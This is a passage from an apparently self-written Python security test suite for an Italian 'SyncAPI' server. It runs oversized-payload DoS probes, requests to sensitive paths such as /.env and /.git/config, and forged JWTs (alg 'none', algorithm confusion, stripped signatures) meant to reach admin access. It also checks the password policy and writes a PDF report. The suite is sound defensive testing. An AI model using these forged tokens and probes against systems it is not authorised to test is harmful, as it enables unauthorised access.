        huge_string = "A" * (10 * 1024 * 1024)
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(admin_token),
            json={
                "last_sync_timestamp": None,
                "changes": {
                    "customers": [{
                        "uuid": str(uuid.uuid4()),
                        "name": huge_string,
                        "last_modified": datetime.now().isoformat(),
                        "is_deleted": True,
                        "is_synced": True
                    }]
                }
            },
            verify=SSL_VERIFY, timeout=30
        )
        if resp.status_code == 413:
            test_pass(f"Stringa 10MB rifiutata → 413")
        elif resp.status_code in (400, 422):
            test_pass(f"Stringa 10MB rifiutata → {resp.status_code}")
        else:
            test_warn(f"Stringa 10MB → {resp.status_code}")
    except requests.exceptions.ConnectionError:
        test_pass("Stringa 10MB: connessione rifiutata (protezione attiva)")
    except requests.exceptions.Timeout:
        test_pass("Stringa 10MB: timeout (protezione attiva)")
    except Exception as e:
        test_info(f"Stringa 10MB: {e}")


# ============================================================
# TEST 26: OpenAPI / Swagger Exposure
# ============================================================
def test_openapi_exposure():
    print_header("TEST 26: OpenAPI / Swagger / Docs Exposure")

    sensitive_paths = [
        "/docs",
        "/redoc",
        "/openapi.json",
        "/.env",
        "/config.ini",
        "/admin",
        "/.git/config",
        "/.git/HEAD",
        "/debug",
        "/console",
        "/phpinfo.php",
        "/server-status",
        "/actuator",
        "/actuator/env",
        "/metrics",
        "/__debug__/",
    ]

    for path in sensitive_paths:
        try:
            resp = requests.get(
                f"{SERVER_URL}{path}",
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if path in ("/docs", "/redoc", "/openapi.json"):
                if resp.status_code == 200:
                    test_warn(f"{path} è accessibile pubblicamente (espone struttura API)")
                else:
                    test_pass(f"{path} non accessibile → {resp.status_code}")
            elif path in ("/.env", "/config.ini", "/.git/config", "/.git/HEAD"):
                if resp.status_code == 200:
                    test_fail(f"{path} ACCESSIBILE! File sensibile esposto!")
                else:
                    test_pass(f"{path} non accessibile → {resp.status_code}")
            else:
                if resp.status_code == 200:
                    test_warn(f"{path} accessibile → {resp.status_code}")
                else:
                    test_pass(f"{path} non accessibile → {resp.status_code}")
        except Exception as e:
            test_info(f"{path}: {e}")


# ============================================================
# TEST 27: JWT Timing Attack / Algorithm Confusion
# ============================================================
def test_jwt_advanced():
    print_header("TEST 27: JWT Advanced Attacks")

    # 27.1 Algorithm confusion: RS256 → HS256
    # Se il server usa HS256, prova con RS256 header
    for alg in ["RS256", "RS384", "RS512", "ES256", "PS256", "none", "None", "NONE", "nOnE"]:
        try:
            header = base64.urlsafe_b64encode(json.dumps({"alg": alg, "typ": "JWT"}).encode()).rstrip(b"=").decode()
            payload_data = base64.urlsafe_b64encode(json.dumps({
                "sub": "admin", "role": "admin", "exp": 9999999999
            }).encode()).rstrip(b"=").decode()
            fake_sig = base64.urlsafe_b64encode(b"x" * 32).rstrip(b"=").decode()
            token = f"{header}.{payload_data}.{fake_sig}"

            resp = requests.get(
                f"{SERVER_URL}/users",
                headers=auth_header(token),
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 401:
                test_pass(f"JWT alg='{alg}' → 401 (bloccato)")
            elif resp.status_code == 200:
                test_fail(f"JWT BYPASS con alg='{alg}'! VULNERABILITÀ CRITICA!")
            else:
                test_info(f"JWT alg='{alg}' → {resp.status_code}")
        except Exception as e:
            test_info(f"JWT alg '{alg}': {e}")

    # 27.2 JWT senza parte firma
    try:
        header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        payload_data = base64.urlsafe_b64encode(json.dumps({
            "sub": "admin", "role": "admin", "exp": 9999999999
        }).encode()).rstrip(b"=").decode()
        token_no_sig = f"{header}.{payload_data}."

        resp = requests.get(
            f"{SERVER_URL}/users",
            headers=auth_header(token_no_sig),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("JWT senza firma → 401")
        else:
            test_fail(f"JWT senza firma → {resp.status_code} — BYPASS!")
    except Exception as e:
        test_info(f"JWT no-sig: {e}")

    # 27.3 JWT con payload corrotto
    try:
        token_corrupt = "eyJhbGciOiJIUzI1NiJ9.CORRUPTED_PAYLOAD.fake"
        resp = requests.get(
            f"{SERVER_URL}/users",
            headers=auth_header(token_corrupt),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("JWT con payload corrotto → 401")
        else:
            test_info(f"JWT corrotto → {resp.status_code}")
    except Exception as e:
        test_info(f"JWT corrotto: {e}")


# ============================================================
# TEST 28: Password Security Policy
# ============================================================
def test_password_policy(admin_token):
    print_header("TEST 28: Password Security Policy")

    if not admin_token:
        test_skip("Token admin necessario")
        return

    weak_passwords = [
        ("a", "Troppo corta (1 char)"),
        ("1234567", "7 caratteri (sotto minimo 8)"),
        ("", "Vuota"),
        (" " * 10, "Solo spazi"),
    ]

    for pwd, desc in weak_passwords:
        test_user = f"_sectest_pwd_{abs(hash(pwd)) % 10000}"
        try:
            resp = requests.post(
                f"{SERVER_URL}/users",
                headers=auth_header(admin_token),
                json={"username": test_user, "password": pwd, "role": "technician"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code in (400, 422):
                test_pass(f"Password debole rifiutata: {desc} → {resp.status_code}")
            elif resp.status_code == 200:
                test_fail(f"Password debole ACCETTATA: {desc}")
                # Cleanup
                try:
                    requests.delete(
                        f"{SERVER_URL}/users/{test_user}",
                        headers=auth_header(admin_token),
                        verify=SSL_VERIFY, timeout=TIMEOUT
                    )
                except Exception:
                    pass
            else:
                test_info(f"Password '{desc}' → {resp.status_code}")
        except Exception as e:
            test_info(f"Password policy: {e}")


def generate_pdf_report():
    """Genera un report PDF con tutti i risultati dei test."""
    try:
        from reportlab.lib.pagesizes import A4
        from reportlab.lib import colors
        from reportlab.lib.units import mm
        from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib.enums import TA_CENTER, TA_LEFT
    except ImportError:
        print("  ⚠️  reportlab non installato — impossibile generare PDF")
        return None

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"SecurityReport_API_{timestamp}.pdf"
    doc = SimpleDocTemplate(filename, pagesize=A4,
                            leftMargin=15*mm, rightMargin=15*mm,
                            topMargin=15*mm, bottomMargin=15*mm)

    styles = getSampleStyleSheet()
    title_style = ParagraphStyle('ReportTitle', parent=styles['Title'], fontSize=18,
                                  spaceAfter=6*mm, textColor=colors.HexColor('#1a237e'))
    subtitle_style = ParagraphStyle('Subtitle', parent=styles['Normal'], fontSize=10,
                                     textColor=colors.grey, spaceAfter=4*mm, alignment=TA_CENTER)
    section_style = ParagraphStyle('Section', parent=styles['Heading2'], fontSize=12,
                                    textColor=colors.HexColor('#1a237e'), spaceBefore=5*mm, spaceAfter=2*mm)
    cell_style = ParagraphStyle('Cell', parent=styles['Normal'], fontSize=7.5, leading=10)

    elements = []

    # Titolo
    elements.append(Paragraph("Security Test Report - API", title_style))
    elements.append(Paragraph(f"Server: {SERVER_URL} | Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", subtitle_style))

    # Riepilogo
    total = RESULTS['passed'] + RESULTS['failed'] + RESULTS['warnings'] + RESULTS['skipped']
    testable = RESULTS['passed'] + RESULTS['failed']
    score = (RESULTS['passed'] / testable * 100) if testable > 0 else 0

    summary_data = [
        ['Metrica', 'Valore'],
        ['Superati', str(RESULTS['passed'])],
        ['Falliti', str(RESULTS['failed'])],
        ['Warning', str(RESULTS['warnings'])],
        ['Saltati', str(RESULTS['skipped'])],
        ['Totale', str(total)],
        ['Security Score', f"{score:.0f}%"],
    ]
    summary_table = Table(summary_data, colWidths=[60*mm, 40*mm])
    score_color = colors.HexColor('#2e7d32') if score >= 90 else (colors.HexColor('#f57f17') if score >= 70 else colors.HexColor('#c62828'))
    summary_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#1a237e')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, -1), 9),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
        ('ALIGN', (1, 0), (1, -1), 'CENTER'),
        ('BACKGROUND', (0, -1), (-1, -1), score_color),
        ('TEXTCOLOR', (0, -1), (-1, -1), colors.white),
        ('FONTNAME', (0, -1), (-1, -1), 'Helvetica-Bold'),
    ]))
    elements.append(summary_table)
    elements.append(Spacer(1, 6*mm))

    # Dettaglio test per sezione
    color_map = {
        'pass': colors.HexColor('#e8f5e9'),
        'fail': colors.HexColor('#ffebee'),
        'warn': colors.HexColor('#fff8e1'),
        'skip': colors.HexColor('#e3f2fd'),
    }
    label_map = {'pass': 'PASS', 'fail': 'FAIL', 'warn': 'WARN', 'skip': 'SKIP'}
    text_color_map = {
        'pass': colors.HexColor('#2e7d32'),
        'fail': colors.HexColor('#c62828'),
        'warn': colors.HexColor('#f57f17'),
        'skip': colors.HexColor('#1565c0'),
    }

    current_section = None
    section_rows = []

    def flush_section():
        if not section_rows:
            return
        table_data = [['Esito', 'Dettaglio']]
        row_colors_list = [None]
        for tipo, msg in section_rows:
            safe_msg = msg.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            table_data.append([label_map.get(tipo, tipo.upper()), Paragraph(safe_msg, cell_style)])
            row_colors_list.append(tipo)
        t = Table(table_data, colWidths=[18*mm, 162*mm])
        style_cmds = [
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#37474f')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 8),
            ('GRID', (0, 0), (-1, -1), 0.3, colors.HexColor('#bdbdbd')),
            ('VALIGN', (0, 0), (-1, -1), 'TOP'),
        ]
        for i, tipo in enumerate(row_colors_list):
            if tipo and tipo in color_map:
                style_cmds.append(('BACKGROUND', (0, i), (-1, i), color_map[tipo]))
                style_cmds.append(('TEXTCOLOR', (0, i), (0, i), text_color_map[tipo]))
                style_cmds.append(('FONTNAME', (0, i), (0, i), 'Helvetica-Bold'))
        t.setStyle(TableStyle(style_cmds))
        elements.append(t)
        elements.append(Spacer(1, 2*mm))

    for entry_type, section, msg in TEST_LOG:
        if entry_type == 'header':
            flush_section()
            section_rows = []
            current_section = section
            elements.append(Paragraph(section, section_style))
        else:
            section_rows.append((entry_type, msg))

    flush_section()

    try:
        doc.build(elements)
        return filename
    except Exception as e:
        print(f"  ❌ Errore generazione PDF: {e}")
        return None


# ============================================================
# ESECUZIONE PRINCIPALE
# ============================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Test di sicurezza API — Safety Test Manager")
    parser.add_argument("--verbose", "-v", action="store_true", help="Output dettagliato")
    parser.add_argument("--skip-destructive", action="store_true", help="Salta test che creano/eliminano dati")
    parser.add_argument("--skip-ratelimit", action="store_true", help="Salta test rate limiting (lenti)")
    parser.add_argument("--username", type=str, help="Username admin per i test autenticati")
    parser.add_argument("--password", type=str, help="Password admin (se non fornita, verrà richiesta)")
    args = parser.parse_args()

    VERBOSE = args.verbose

    print("\n" + "🛡️" * 30)
    print("  TEST DI SICUREZZA API - Safety Test Manager SyncAPI")
    print("  " + "🛡️" * 30)
    print(f"\n  Server:       {SERVER_URL}")
    print(f"  SSL Verify:   {SSL_VERIFY}")
    print(f"  Data test:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Destructive:  {'NO' if args.skip_destructive else 'SÌ'}")
    print(f"  Rate limit:   {'SKIP' if args.skip_ratelimit else 'SÌ'}")

    # --- Verifica connessione ---
    print_header("CONNESSIONE AL SERVER")
    try:
        resp = requests.get(f"{SERVER_URL}/", verify=SSL_VERIFY, timeout=TIMEOUT)
        if resp.status_code == 200:
            test_pass(f"Server raggiungibile → {resp.json()}")
        else:
            test_fail(f"Server risponde con {resp.status_code}")
            print("\n  ⛔ Server non raggiungibile. Impossibile continuare.")
            sys.exit(1)
    except Exception as e:
        test_fail(f"Server non raggiungibile: {e}")
        print("\n  ⛔ Verifica che il server sia in esecuzione e config.ini sia corretto.")
        sys.exit(1)

    # --- Login admin ---
    admin_token = None
    user_token = None
    admin_username = args.username
    admin_password = None

    if admin_username:
        admin_password = args.password or getpass.getpass(f"\n  🔑 Password per '{admin_username}': ")
        admin_token = login(admin_username, admin_password)
        if admin_token:
            test_pass(f"Login admin '{admin_username}' riuscito")
        else:
            test_warn(f"Login admin fallito — alcuni test saranno saltati")
    else:
        print(f"\n  ℹ️  Per eseguire TUTTI i test, fornisci credenziali admin.")
        admin_username = input("  👤 Username admin (INVIO per saltare): ").strip()
        if admin_username:
            admin_password = getpass.getpass(f"  🔑 Password per '{admin_username}': ")
            admin_token = login(admin_username, admin_password)
            if admin_token:
                test_pass(f"Login admin '{admin_username}' riuscito")
            else:
                test_warn(f"Login admin '{admin_username}' fallito")
                admin_username = None
        else:
            test_info("Nessun admin — test limitati agli endpoint pubblici")

    # --- Esegui tutti i test ---
    test_authentication()
    test_unauthenticated_access()
    test_jwt_security()

    # Rate limiting PRIMA di SQL injection, così l'IP non è già bloccato
    if not args.skip_ratelimit:
        test_rate_limiting(admin_username, admin_password)
        # Attendi che il rate limiter si resetti prima dei test SQLi
        print(f"\n  ⏳ Attesa 65 secondi per reset rate limiter prima dei test SQLi...")
        time.sleep(65)
    else:
        print_header("TEST 9: Rate Limiting")
        test_skip("Rate limiting test saltato (--skip-ratelimit)")

    test_sql_injection()
    test_authorization(admin_token, user_token)
    test_input_validation(admin_token)
    test_information_leakage(admin_token)
    test_security_headers()
    test_upload_security(admin_token)
    test_hard_delete_security(admin_token)
    test_xss_and_injection()
    test_user_management(admin_token, admin_username, args.skip_destructive)
    test_http_methods()

    # --- TEST AGGRESSIVI AGGIUNTIVI ---
    test_ssrf(admin_token)
    test_cors()
    test_host_header_injection()
    test_idor(admin_token)
    test_command_injection(admin_token)
    test_path_traversal(admin_token)
    test_race_conditions(admin_token)
    test_encoding_attacks()
    test_token_reuse_after_password_change(admin_token, admin_username, admin_password)
    test_mass_assignment(admin_token)
    test_dos_patterns(admin_token)
    test_openapi_exposure()
    test_jwt_advanced()
    test_password_policy(admin_token)

    # ============================================================
    # RIEPILOGO FINALE
    # ============================================================
    print_header("📊 RIEPILOGO FINALE")
    total = RESULTS["passed"] + RESULTS["failed"] + RESULTS["warnings"] + RESULTS["skipped"]
    print(f"  ✅ Superati:     {RESULTS['passed']}")
    print(f"  ❌ Falliti:      {RESULTS['failed']}")
    print(f"  ⚠️  Attenzione:   {RESULTS['warnings']}")
    print(f"  ⏭️  Saltati:      {RESULTS['skipped']}")
    print(f"  📊 Totale:       {total}")

    # Calcola score
    testable = RESULTS["passed"] + RESULTS["failed"]
    if testable > 0:
        score = (RESULTS["passed"] / testable) * 100
        print(f"\n  🏆 Security Score: {score:.0f}% ({RESULTS['passed']}/{testable})")
    
    if RESULTS["failed"] == 0 and RESULTS["warnings"] == 0:
        print(f"\n  🎉 ECCELLENTE! Tutti i test superati senza warning!")
    elif RESULTS["failed"] == 0:
        print(f"\n  👍 BUONO! Tutti i test superati, ma {RESULTS['warnings']} warning da valutare.")
    elif RESULTS["failed"] <= 3:
        print(f"\n  ⚠️  ATTENZIONE: {RESULTS['failed']} test falliti. Verificare le vulnerabilità.")
    else:
        print(f"\n  🚨 CRITICO: {RESULTS['failed']} test falliti! Correggere immediatamente!")

    # --- Genera report PDF ---
    pdf_path = generate_pdf_report()
    if pdf_path:
        print(f"  📄 Report PDF generato: {pdf_path}")

    print()
    sys.exit(0 if RESULTS["failed"] == 0 else 1)
